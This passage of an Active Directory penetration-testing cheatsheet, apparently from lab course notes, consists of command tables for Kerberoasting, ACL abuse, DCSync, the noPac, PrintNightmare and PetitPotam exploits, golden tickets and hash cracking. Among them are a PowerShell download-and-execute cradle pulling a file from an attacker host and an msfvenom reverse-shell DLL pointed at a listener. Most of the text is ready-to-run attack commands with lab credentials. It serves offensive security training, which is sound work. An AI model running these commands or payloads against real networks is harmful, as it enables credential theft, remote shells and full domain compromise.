| `.\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data`          | Runs a tool called `Snaffler` against a target Windows domain that finds various kinds of data in shares that the compromised account has access to. Performed from a Windows-based host. |

#### Transfering Files

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `sudo python3 -m http.server 8001`                           | Starts a python web server for quick hosting of files. Performed from a Linux-basd host. |
| `"IEX(New-Object Net.WebClient).downloadString('http://172.16.5.222/SharpHound.exe')"` | PowerShell one-liner used to download a file from a web server. Performed from a Windows-based host. |
| `impacket-smbserver -ip 172.16.5.x -smb2support -username user -password password shared /home/administrator/Downloads/` | Starts a impacket `SMB` server for quick hosting of a file. Performed from a Windows-based host. |

#### Kerberoasting 

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `sudo python3 -m pip install .`                              | Used to install Impacket from inside the directory that gets cloned to the attack host. Performed from a Linux-based host. |
| `GetUserSPNs.py -h`                                          | Impacket tool used to display the options and functionality of `GetUserSPNs.py` from a Linux-based host. |
| `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday` | Impacket tool used to get a list of `SPNs` on the target Windows domain from  a Linux-based host. |
| `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request` | Impacket tool used to download/request (`-request`) all TGS tickets for offline processing from a Linux-based host. |
| `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev` | Impacket tool used to download/request (`-request-user`) a TGS ticket for a specific user account (`sqldev`) from a Linux-based host. |
| `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs` | Impacket tool used to download/request a TGS ticket for a specific user account and write the ticket to a file (`-outputfile sqldev_tgs`) linux-based host. |
| `hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force` | Attempts to crack the Kerberos (`-m 13100`) ticket hash (`sqldev_tgs`) using `hashcat` and a wordlist (`rockyou.txt`) from a Linux-based host. |
| `setspn.exe -Q */*`                                          | Used to enumerate `SPNs` in a target Windows domain from a Windows-based host. |
| `Add-Type -AssemblyName System.IdentityModel  New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"` | PowerShell script used to download/request the TGS ticket of a specific user from a Windows-based host. |
| `setspn.exe -T INLANEFREIGHT.LOCAL -Q */* \| Select-String '^CN' -Context 0,1 \| % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }` | Used to download/request all TGS tickets from a WIndows-based host. |
| `mimikatz # base64 /out:true`                                | `Mimikatz` command that ensures TGS tickets are extracted in `base64` format from a Windows-based host. |
| `kerberos::list /export `                                    | `Mimikatz` command used to extract the TGS tickets from a Windows-based host. |
| `echo "<base64 blob>" \|  tr -d \\n `                         | Used to prepare the base64 formatted TGS ticket for cracking from Linux-based host. |
| `cat encoded_file \| base64 -d > sqldev.kirbi`                 | Used to output a file (`encoded_file`) into a .kirbi file in base64 (`base64 -d > sqldev.kirbi`) format from a Linux-based host. |
| `python2.7 kirbi2john.py sqldev.kirbi`                       | Used to extract the `Kerberos ticket`. This also creates a file called `crack_file` from a Linux-based host. |
| `sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat` | Used to modify the `crack_file` for `Hashcat` from a Linux-based host. |
| `cat sqldev_tgs_hashcat `                                    | Used to view the prepared hash from a Linux-based host.      |
| `hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt ` | Used to crack the prepared Kerberos ticket hash (`sqldev_tgs_hashcat`) using a wordlist (`rockyou.txt`) from a Linux-based host. |
| `Import-Module .\PowerView.ps1  Get-DomainUser * -spn \| select samaccountname` | Uses PowerView tool to extract `TGS Tickets` . Performed from a Windows-based host. |
| `Get-DomainUser -Identity sqldev \| Get-DomainSPNTicket -Format Hashcat` | PowerView tool used to download/request the TGS ticket of a specific ticket and automatically format it for `Hashcat` from a Windows-based host. |
| `Get-DomainUser * -SPN \| Get-DomainSPNTicket -Format Hashcat \| Export-Csv .\ilfreight_tgs.csv -NoTypeInformation` | Exports all TGS tickets to a `.CSV` file (`ilfreight_tgs.csv`) from a Windows-based host. |
| `cat .\ilfreight_tgs.csv`                                    | Used to view the contents of the .csv file from a Windows-based host. |
| `.\Rubeus.exe`                                               | Used to view the options and functionality possible with the tool `Rubeus`. Performed from a Windows-based host. |
| `.\Rubeus.exe kerberoast /stats`                             | Used to check the kerberoast stats (`/stats`) within the target Windows domain from a Windows-based host. |
| `.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap` | Used to request/download TGS tickets for accounts with the `admin` count set to `1` then formats the output in an easy to view & crack manner (`/nowrap`) . Performed from a Windows-based host. |
| `.\Rubeus.exe kerberoast /user:testspn /nowrap`              | Used to request/download a TGS ticket for a specific user (`/user:testspn`) the formats the output in an easy to view & crack manner (`/nowrap`). Performed from a Windows-based host. |
| `Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes` | PowerView tool used to check the `msDS-SupportedEncryptionType` attribute associated with a specific user account (`testspn`). Performed from a Windows-based host. |
| `hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt` | Used to attempt to crack the ticket hash using a wordlist (`rockyou.txt`) from a Linux-based host . |

#### ACL Enumeration & Tactics 

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `Find-InterestingDomainAcl`                                  | PowerView tool used to find object ACLs in the target Windows domain with modification rights set to non-built in objects from a Windows-based host. |
| `Import-Module .\PowerView.ps1  $sid = Convert-NameToSid wley` | Used to import PowerView and retrieve the `SID` of a specific user account (`wley`) from a Windows-based host. |
| `Get-DomainObjectACL -Identity * \| ? {$_.SecurityIdentifier -eq $sid}` | Used to find all Windows domain objects that the user has rights over by mapping the user's `SID` to the `SecurityIdentifier` property from a Windows-based host. |
| `$guid= "00299570-246d-11d0-a768-00aa006e0529"   Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * \| Select Name,DisplayName,DistinguishedName,rightsGuid \| ?{$_.rightsGuid -eq $guid} \| fl` | Used to perform a reverse search & map to a `GUID` value from a Windows-based host. |
| `Get-DomainObjectACL -ResolveGUIDs -Identity * \| ? {$_.SecurityIdentifier -eq $sid} ` | Used to discover a domain object's ACL by performing a search based on GUID's (`-ResolveGUIDs`) from a Windows-based host. |
| `Get-ADUser -Filter * \| Select-Object -ExpandProperty SamAccountName > ad_users.txt` | Used to discover a group of user accounts in a target Windows domain and add the output to a text file (`ad_users.txt`) from a Windows-based host. |
| `foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" \| Select-Object Path -ExpandProperty Access \| Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}` | A `foreach loop` used to retrieve ACL information for each domain user in a target Windows domain by feeding each list of a text file(`ad_users.txt`) to the `Get-ADUser` cmdlet, then enumerates access rights of those users. Performed from a Windows-based host. |
| `$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) ` | Used to create a `PSCredential Object` from a Windows-based host. |
| `$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force` | Used to create a `SecureString Object` from a Windows-based host. |
| `Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose` | PowerView tool used to change the password of a specifc user (`damundsen`) on a target Windows domain from a Windows-based host. |
| `Get-ADGroup -Identity "Help Desk Level 1" -Properties * \| Select -ExpandProperty Members` | PowerView tool used view the members of a target security group (`Help Desk Level 1`) from a Windows-based host. |
| `Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose` | PowerView tool used to add a specifc user (`damundsen`) to a specific security group (`Help Desk Level 1`) in a target Windows domain from a Windows-based host. |
| `Get-DomainGroupMember -Identity "Help Desk Level 1" \| Select MemberName` | PowerView tool used to view the members of a specific security group (`Help Desk Level 1`) and output only the username of each member (`Select MemberName`) of the group from a Windows-based host. |
| `Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose` | PowerView tool used create a fake `Service Principal Name` given a sepecift user (`adunn`) from a Windows-based host. |
| `Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose` | PowerView tool used to remove the fake `Service Principal Name` created during the attack from a Windows-based host. |
| `Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose` | PowerView tool used to remove a specific user (`damundsent`) from a specific security group (`Help Desk Level 1`) from a Windows-based host. |
| `ConvertFrom-SddlString`                                     | PowerShell cmd-let used to covert an `SDDL string` into a readable format. Performed from a Windows-based host. |

#### DCSync 

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `Get-DomainUser -Identity adunn  \| select samaccountname,objectsid,memberof,useraccountcontrol \|fl` | PowerView tool used to view the group membership of a specific user (`adunn`) in a target Windows domain. Performed from a Windows-based host. |
| `$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164" Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs \| ? { ($_.ObjectAceType -match 'Replication-Get')} \| ?{$_.SecurityIdentifier -match $sid} \| select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType \| fl` | Used to create a variable called SID that is set equal to the SID of a user account. Then uses PowerView tool `Get-ObjectAcl` to check a specific user's replication rights. Performed from a Windows-based host. |
| `secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 -use-vss` | Impacket tool sed to extract NTLM hashes from the NTDS.dit file hosted on a target Domain Controller (`172.16.5.5`) and save the extracted hashes to an file (`inlanefreight_hashes`). Performed from a Linux-based host. |
| `mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator` | Uses `Mimikatz` to perform a `dcsync` attack from a Windows-based host. |

#### Privileged Access 

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"` | PowerView based tool to used to enumerate the `Remote Desktop Users` group on a Windows target (`-ComputerName ACADEMY-EA-MS01`) from a Windows-based host. |
| `Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"` | PowerView based tool to used to enumerate the `Remote Management Users` group on a Windows target (`-ComputerName ACADEMY-EA-MS01`) from a Windows-based host. |
| `$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force` | Creates a variable (`$password`) set equal to the password (`Klmcargo2`) of a user from a Windows-based host. |
| `$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)` | Creates a variable (`$cred`) set equal to the username (`forend`) and password (`$password`) of a target domain account from a Windows-based host. |
| `Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred` | Uses the PowerShell cmd-let `Enter-PSSession` to establish a PowerShell session with a target over the network (`-ComputerName ACADEMY-EA-DB01`) from a Windows-based host. Authenticates using credentials made in the 2 commands shown prior (`$cred` & `$password`). |
| `evil-winrm -i 10.129.201.234 -u forend`                     | Used to establish a PowerShell session with a Windows target from a Linux-based host using `WinRM`. |
| `Import-Module .\PowerUpSQL.ps1`                             | Used to import the `PowerUpSQL` tool.                        |
| `Get-SQLInstanceDomain`                                      | PowerUpSQL tool used to enumerate SQL server instances from a Windows-based host. |
| `Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'` | PowerUpSQL tool used to connect to connect to a SQL server and query the version (`-query 'Select @@version'`) from a Windows-based host. |
| `mssqlclient.py`                                             | Impacket tool used to display the functionality and options provided with `mssqlclient.py` from a Linux-based host. |
| `mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth` | Impacket tool used to connect to a MSSQL server from a Linux-based host. |
| `SQL> help`                                                  | Used to display mssqlclient.py options once connected to a MSSQL server. |
| `SQL> enable_xp_cmdshell`                                   | Used to enable `xp_cmdshell stored procedure` that allows for executing OS commands via the database from a Linux-based host. |
| `xp_cmdshell whoami /priv`                                   | Used to enumerate rights on a system using `xp_cmdshell`.    |

#### NoPac

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `sudo git clone https://github.com/Ridter/noPac.git`         | Used to clone a `noPac` exploit using git. Performed from a Linux-based host. |
| `sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap` | Runs `scanner.py` to check if a target system is vulnerable to `noPac`/`Sam_The_Admin` from a Linux-based host. |
| `sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap` | Used to exploit the `noPac`/`Sam_The_Admin`  vulnerability and gain a SYSTEM shell (`-shell`). Performed from a Linux-based host. |
| `sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator` | Used to exploit the `noPac`/`Sam_The_Admin`  vulnerability and perform a `DCSync` attack against the built-in Administrator account on a Domain Controller from a Linux-based host. |

#### PrintNightmare

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `git clone https://github.com/cube0x0/CVE-2021-1675.git`     | Used to clone a PrintNightmare exploit  using git from a Linux-based host. |
| `pip3 uninstall impacket git clone https://github.com/cube0x0/impacket cd impacket python3 ./setup.py install` | Used to ensure the exploit author's (`cube0x0`) version of Impacket is installed. This also uninstalls any previous Impacket version on a Linux-based host. |
| `rpcdump.py @172.16.5.5 \| egrep 'MS-RPRN\|MS-PAR'`            | Used to check if a Windows target has `MS-PAR` & `MSRPRN` exposed from a Linux-based host. |
| `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.129.202.111 LPORT=8080 -f dll > backupscript.dll` | Used to generate a DLL payload to be used by the exploit to gain a shell session. Performed from a Windows-based host. |
| `sudo smbserver.py -smb2support CompData /path/to/backupscript.dll` | Used to create an SMB server and host a shared folder (`CompData`) at the specified location on the local linux host. This can be used to host the DLL payload that the exploit will attempt to download to the host. Performed from a Linux-based host. |
| `sudo python3 CVE-2021-1675.py inlanefreight.local/<username>:<password>@172.16.5.5 '\\10.129.202.111\CompData\backupscript.dll'` | Executes the exploit and specifies the location of the DLL payload. Performed from a Linux-based host. |

#### PetitPotam

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController` | Impacket tool used to create an `NTLM relay` by specifiying the web enrollment URL for the `Certificate Authority` host. Perfomred from a Linux-based host. |
| `git clone https://github.com/topotam/PetitPotam.git`        | Used to clone the `PetitPotam` exploit using git. Performed from a Linux-based host. |
| `python3 PetitPotam.py 172.16.5.225 172.16.5.5`              | Used to execute the PetitPotam exploit by  specifying the IP address of the attack host (`172.16.5.255`) and the target Domain Controller (`172.16.5.5`). Performed from a Linux-based host. |
| `python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <base64 certificate> = dc01.ccache` | Uses `gettgtpkinit`.py to request a TGT ticket for the Domain Controller (`dc01.ccache`) from a Linux-based host. |
| `secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL` | Impacket tool used to perform a DCSync attack and retrieve one or all of the `NTLM password hashes` from the target Windows domain. Performed from a Linux-based host. |
| `klist`                                                      | `krb5-user` command used to view the contents of the `ccache` file. Performed from a Linux-based host. |
| `python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$` | Used to submit TGS requests using `getnthash.py` from a Linux-based host. |
| `secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba` | Impacket tool used to extract hashes from `NTDS.dit` using a `DCSync attack` and a captured hash (`-hashes`). Performed from a Linux-based host. |
| `.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /<base64 certificate>=/ptt` | Uses Rubeus to request a TGT and perform a `pass-the-ticket attack` using the machine account (`/user:ACADEMY-EA-DC01$`) of a Windows target. Performed from a Windows-based host. |
| `mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt`      | Performs a DCSync attack using `Mimikatz`. Performed from a Windows-based host. |

#### Miscellaneous Misconfigurations

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `Import-Module .\SecurityAssessment.ps1`                     | Used to import the module `Security Assessment.ps1`. Performed from a Windows-based host. |
| `Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL` | SecurityAssessment.ps1 based tool used to enumerate a Windows target for `MS-PRN Printer bug`. Performed from a Windows-based host. |
| `adidnsdump -u inlanefreight\\forend ldap://172.16.5.5`      | Used to resolve all records in a DNS zone over `LDAP` from a Linux-based host. |
| `adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r`   | Used to resolve unknown records in a DNS zone by performing an `A query` (`-r`) from a Linux-based host. |
| `Get-DomainUser * \| Select-Object samaccountname,description ` | PowerView tool used to display the description field of select objects (`Select-Object`) on a target Windows domain from a Windows-based host. |
| `Get-DomainUser -UACFilter PASSWD_NOTREQD \| Select-Object samaccountname,useraccountcontrol` | PowerView tool used to check for the `PASSWD_NOTREQD` setting of select objects (`Select-Object`) on a target Windows domain from a Windows-based host. |
| `ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts`    | Used to list the contents of a share hosted on a Windows target from the context of a currently logged on user. Performed from a Windows-based host. |

#### Group Policy Enumeration & Attacks

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE`    | Tool used to decrypt a captured `group policy preference password` from a Linux-based host. |
| `crackmapexec smb -L \| grep gpp`                              | Locates and retrieves a `group policy preference password` using `CrackMapExec`, the filters the output using `grep`. Peformed from a Linux-based host. |
| `crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin` | Locates and retrieves any credentials stored in the `SYSVOL` share of a Windows target using `CrackMapExec` from a Linux-based host. |
| `Get-DomainGPO \| select displayname`                          | PowerView tool used to enumerate GPO names in a target Windows domain from a Windows-based host. |
| `Get-GPO -All \| Select DisplayName`                          | PowerShell cmd-let used to enumerate GPO names. Performed from a Windows-based host. |
| `$sid=Convert-NameToSid "Domain Users" `                     | Creates a variable called `$sid` that is set equal to the `Convert-NameToSid` tool and specifies the group account `Domain Users`. Performed from a Windows-based host. |
| `Get-DomainGPO \| Get-ObjectAcl \| ?{$_.SecurityIdentifier -eq $sid` | PowerView tool that is used to check if the `Domain Users`  (`eq $sid`) group has any rights over one or more GPOs. Performed from a Windows-based host. |
| `Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532`         | PowerShell cmd-let used to display the name of a GPO given a `GUID`. Performed from a Windows-based host. |

#### ASREPRoasting

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `Get-DomainUser -PreauthNotRequired \| select samaccountname,userprincipalname,useraccountcontrol \| fl` | PowerView based tool used to search for the `DONT_REQ_PREAUTH` value across in user accounts in a target Windows domain. Performed from a Windows-based host. |
| `.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat` | Uses `Rubeus` to perform an `ASEP Roasting attack` and formats the output for `Hashcat`. Performed from a Windows-based host. |
| `hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt ` | Uses `Hashcat` to attempt to crack the captured hash using a wordlist (`rockyou.txt`). Performed from a Linux-based host. |
| `kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt ` | Enumerates users in a target Windows domain and automatically retrieves the `AS` for any users found that don't require Kerberos pre-authentication. Performed from a Linux-based host. |

#### Trust Relationships - Child > Parent Trusts 

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `Import-Module activedirectory`                              | Used to import the `Active Directory` module. Performed from a Windows-based host. |
| `Get-ADTrust -Filter *`                                      | PowerShell cmd-let used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host. |
| `Get-DomainTrust `                                           | PowerView tool used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host. |
| `Get-DomainTrustMapping`                                     | PowerView tool used to perform a domain trust mapping from a Windows-based host. |
| `Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL \| select SamAccountName` | PowerView tools used to enumerate users in a target child domain from a Windows-based host. |
| `mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt`          | Uses Mimikatz to obtain the `KRBTGT` account's `NT Hash` from a Windows-based host. |
| `Get-DomainSID`                                              | PowerView tool used to get the SID for a target child domain from a Windows-based host. |
| `Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" \| select distinguishedname,objectsid` | PowerView tool used to obtain the `Enterprise Admins` group's SID from a Windows-based host. |
| `ls \\academy-ea-dc01.inlanefreight.local\c$`                | Used to attempt to list the contents of the C drive on a target Domain Controller. Performed from a Windows-based host. |
| `mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt` | Uses `Mimikatz` to create a `Golden Ticket` from a Windows-based host . |
| `.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt` | Uses `Rubeus` to create a `Golden Ticket` from a Windows-based host. |
| `mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm`     | Uses `Mimikatz` to perform a DCSync attack from a Windows-based host. |
| `secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt` | Impacket tool used to perform a DCSync attack from a Linux-based host. |
| `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 ` | Impacket tool used to perform a `SID Brute forcing` attack from a Linux-based host. |
| `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 \| grep "Domain SID"` | Impacket tool used to retrieve the SID of a target Windows domain from a Linux-based host. |
| `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 \| grep -B12 "Enterprise Admins"` | Impacket tool used to retrieve the `SID` of a target Windows domain and attach it to the Enterprise Admin group's `RID` from a Linux-based host. |
| `ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker` | Impacket tool used to create a `Golden Ticket` from a Linux-based host. |
| `export KRB5CCNAME=hacker.ccache`                            | Used to set the `KRB5CCNAME Environment Variable` from a Linux-based host. |
| `psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5` | Impacket tool used to establish a shell session with a target Domain Controller from a Linux-based host. |
| `raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm` | Impacket tool that automatically performs an attack that escalates from child to parent domain. |

#### Trust Relationships - Cross-Forest 

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL \| select SamAccountName` | PowerView tool used to enumerate accounts for associated `SPNs` from a Windows-based host. |
| `Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc \| select samaccountname,memberof` | PowerView tool used to enumerate the `mssqlsvc` account from a Windows-based host. |
| ` .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap` | Uses `Rubeus` to perform a Kerberoasting Attack against a target Windows domain (`/domain:FREIGHTLOGISTICS.local`) from a Windows-based host. |
| `Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL` | PowerView tool used to enumerate groups with users that do not belong to the domain from a Windows-based host. |
| `Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator` | PowerShell cmd-let used to remotely connect to a target Windows system from a Windows-based host. |
| `GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley` | Impacket tool used to request (`-request`) the TGS ticket of an account in a target Windows domain (`-target-domain`) from a Linux-based host. |
| `bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2` | Runs the Python implementation of `BloodHound` against a target Windows domain from a Linux-based host. |
| `zip -r ilfreight_bh.zip *.json`                             | Used to compress multiple files into 1 single `.zip` file to be uploaded into the BloodHound GUI. |

## Active Directory LDAP

### Cheatsheet

| **Command** | **Description** |
| --------------|-------------------|
| `xfreerdp /v:<target IP address> /u:htb-student /p:<password>` | RDP to lab target |
| `Get-ADGroup -Identity "<GROUP NAME" -Properties *` | Get information about an AD group |
| `whoami /priv`                                      | View a user's current rights  |
| ` Get-WindowsCapability -Name RSAT* -Online \| Select-Object -Property Name, State` | Check if RSAT tools are installed |
| `Get-WindowsCapability -Name RSAT* -Online \| Add-WindowsCapability –Online` | Install all RSAT tools |
| `runas /netonly /user:htb.local\jackie.may powershell` | Run a utility as another user |
| `Get-ADObject -LDAPFilter '(objectClass=group)' \| select cn` | LDAP query to return all AD groups |
| `Get-ADUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=2)' \| select name` | List disabled users |
| `(Get-ADUser -SearchBase "OU=Employees,DC=INLANEFREIGHT,DC=LOCAL" -Filter *).count` | Count all users in an OU |
| `get-ciminstance win32_product \| fl` | Query for installed software |
| `Get-ADComputer  -Filter "DNSHostName -like 'SQL*'"` | Get hostnames with the word "SQL" in their hostname |
| `Get-ADGroup -Filter "adminCount -eq 1" \| select Name` | Get all administrative groups |
| `Get-ADUser -Filter {adminCount -eq '1' -and DoesNotRequirePreAuth -eq 'True'}` | Find admin users that don't require Kerberos Pre-Auth |
| `Get-ADUser -Filter {adminCount -gt 0} -Properties admincount,useraccountcontrol` | Enumerate UAC values for admin users |
| `Get-WmiObject -Class win32_group -Filter "Domain='INLANEFREIGHT'"` | Get AD groups using WMI |
| `([adsisearcher]"(&(objectClass=Computer))").FindAll()` | Use ADSI to search for all computers |

## Active Directory PowerView

### Cheatsheet

| **Command** | **Description** |
| --------------|-------------------|
| `xfreerdp /v:<target IP address> /u:htb-student /p:<password>` | RDP to lab target |
| `Get-DomainPolicy` | View the domain password policy |
| `.\SharpView.exe ConvertTo-SID -Name sally.jones`            | Convert a username to a SID |
| `.\SharpView.exe Convert-ADName -ObjectName S-1-5-21-2974783224-3764228556-2640795941-1724` | Convert a SID to a username |
| `Get-DomainUser harry.jones  \| ConvertFrom-UACValue -showall` | List all UAC values |
| `.\SharpView.exe Get-Domain` | View information about the current domain |
| `.\SharpView.exe Get-DomainOU` | List all OUs |
| `.\SharpView.exe Get-DomainUser -KerberosPreauthNotRequired` | Find ASREPRoastable users |
| `Get-DomainComputer ` | Get a listing of domain computers |
| `.\SharpView.exe Get-DomainGPO  \| findstr displayname` | List all GPO names |
| ` Get-DomainGPO -ComputerIdentity WS01` | List GPOs on a specific host |
| `Test-AdminAccess -ComputerName SQL01` | Test local admin access on a remote host |
| `.\SharpView.exe Get-NetShare -ComputerName SQL01` | Enumerate open shares on a remote computer |
| `Find-DomainUserLocation` | Find machines where domain users are logged in |
| `Get-DomainTrust` | View a list of domain trusts |
| `(Get-DomainUser).count` | Count all domain users |
| `.\SharpView.exe Get-DomainUser -Help` | Get help about a SharpView function |
| `Get-DomainUser -Properties samaccountname,description \| Where {$_.description -ne $null}` | Find non-blank user description fields |
| `.\SharpView.exe Get-DomainUser -SPN` | Find users with SPNs set |
| `Find-ForeignGroup` | Find foreign domain users |
| `Get-DomainGroup -Properties Name` | List domain groups |
| `.\SharpView.exe Get-DomainGroupMember -Identity 'Help Desk'` | Get members of a domain group |
| `.\SharpView.exe Get-DomainGroup -AdminCount` | List protected groups |
